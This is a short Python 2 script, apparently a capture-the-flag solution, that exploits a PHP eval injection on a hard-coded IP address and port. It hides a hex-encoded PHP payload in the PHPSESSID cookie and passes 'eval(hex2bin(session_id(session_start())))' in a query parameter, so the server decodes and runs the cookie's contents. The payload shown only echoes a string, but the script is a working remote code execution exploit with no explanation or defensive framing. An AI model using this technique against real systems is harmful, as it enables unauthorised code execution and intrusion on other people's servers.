import requests
url = 'http://82.156.76.166:2333/?exp=eval(hex2bin(session_id(session_start())));'
payload = "echo 'sky cool';".encode('hex')
cookies = {
    'PHPSESSID':payload
}
r = requests.get(url=url,cookies=cookies)
print r.content
 